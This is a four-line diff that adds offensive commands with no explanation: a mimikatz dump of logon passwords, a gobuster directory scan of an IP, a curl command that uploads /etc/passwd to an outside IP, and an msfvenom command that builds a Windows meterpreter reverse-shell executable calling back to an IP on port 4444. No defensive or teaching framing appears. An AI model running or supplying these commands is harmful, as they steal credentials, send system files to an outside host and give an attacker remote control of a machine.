@@ -1,0 +1,4 @@
+mimikatz # sekurlsa::logonpasswords
+gobuster dir -u http://42.136.220.254 -w /usr/share/wordlists/dirb/common.txt
+curl -X POST -F 'file=@/etc/passwd' http://161.66.41.194/upload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=248.203.137.97 LPORT=4444 -f exe > payload.exe
